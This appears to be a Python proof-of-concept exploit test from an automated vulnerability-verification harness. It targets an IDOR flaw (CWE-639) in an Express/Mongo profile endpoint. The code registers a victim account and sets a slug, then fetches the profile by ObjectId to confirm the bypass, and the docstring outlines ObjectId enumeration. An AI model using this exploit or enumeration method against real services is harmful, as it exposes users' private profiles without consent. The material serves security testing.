"""PoC: IDOR via Mongo $or + ObjectId cast in unified profile lookup (CWE-639).

Stage 3 collapses the slug/_id lookup into a single `$or` query. The
opt-in check (`user.slug || user.publicProfile`) is applied to whichever
user `$or` matches. Because Mongoose casts a 24-hex string into ObjectId
on the `_id` branch, any user's _id is now reachable from `/u/:key/profile`
IF that _id happens to equal some OTHER user's opted-in slug — or, more
commonly, any user whose record satisfies the opt-in check (has slug OR
publicProfile=true) leaks through a /u/<24-hex>/profile call.

Simplified exploit: enumerate /u/<hex>/profile with valid 24-char hex. If
an opted-in user's _id matches the hex, their profile is returned —
despite the slug URL being the advertised discovery mechanism. The
enumeration space is narrow (we only need to find one opted-in user's
_id), and Mongo allocates _ids sequentially in 4-byte-timestamp +
5-byte-machine + 3-byte-counter form, so enumeration is feasible if we
can observe any one _id via the signup response.
"""

from __future__ import annotations

import secrets

from mosaic.oracle.exploit import ExploitTest


class ExpressMongoIdCollisionExploit(ExploitTest):
    @property
    def chain_id(self) -> str:
        return "express_mongo_id_collision"

    def execute(self) -> tuple[bool, str]:
        # 1. Create an opted-in "victim" with a slug, capture the returned _id
        email1 = f"victim_{secrets.token_hex(4)}@v.com"
        pw = "Aa11Bb22Cc"
        r = self.http_post("/v1/auth/register", json={"name": "Victim", "email": email1, "password": pw})
        if r.status_code not in (200, 201):
            return False, f"register failed (status={r.status_code}): {r.text[:200]}"
        victim = r.json()
        token1 = (victim.get("tokens") or {}).get("access", {}).get("token")
        vid = (victim.get("user") or {}).get("id") or (victim.get("user") or {}).get("_id")
        if not token1 or not vid:
            return False, f"couldn't extract id/token from register: {victim}"

        # Set slug
        slug = f"victim{secrets.token_hex(3)}"
        rp = self.http_patch(
            "/v1/users/me/slug",
            json={"slug": slug},
            headers={"Authorization": f"Bearer {token1}"},
        )
        # if the PATCH endpoint isn't implemented, try setting slug via generic PATCH
        if rp.status_code not in (200, 204):
            rp = self.http_patch(
                f"/v1/users/{vid}",
                json={"slug": slug},
                headers={"Authorization": f"Bearer {token1}"},
            )
        # Sanity — slug must be set; probe via the vanity endpoint
        probe = self.http_get(f"/v1/users/{slug}/profile")
        if probe.status_code != 200:
            return False, f"slug probe failed (status={probe.status_code}): {probe.text[:200]}"

        # 2. Exploit: fetch the victim using their _id hex — should 404 per VAN-1201
        # original intent (_id lookups opt-in only), but stage 3's $or lets it through.
        attack = self.http_get(f"/v1/users/{vid}/profile")
        if attack.status_code == 200 and slug in (attack.text or ""):
            return True, (
                f"IDOR via Mongo $or + ObjectId cast confirmed (CWE-639). "
                f"/v1/users/{vid}/profile returned profile without needing the opted-in slug URL. "
                f"Status={attack.status_code}. Body: {attack.text[:300]!r}"
            )

        # Fallback: endpoint might return 200 with {name} but not slug. Also count:
        if attack.status_code == 200 and "Victim" in (attack.text or ""):
            return True, (
                f"IDOR by _id confirmed (200 with name). Body: {attack.text[:300]!r}"
            )

        return False, (
            f"No IDOR signal. slug probe ok ({probe.status_code}). "
            f"/_id/ attack status={attack.status_code} body[:200]={attack.text[:200]!r}"
        )
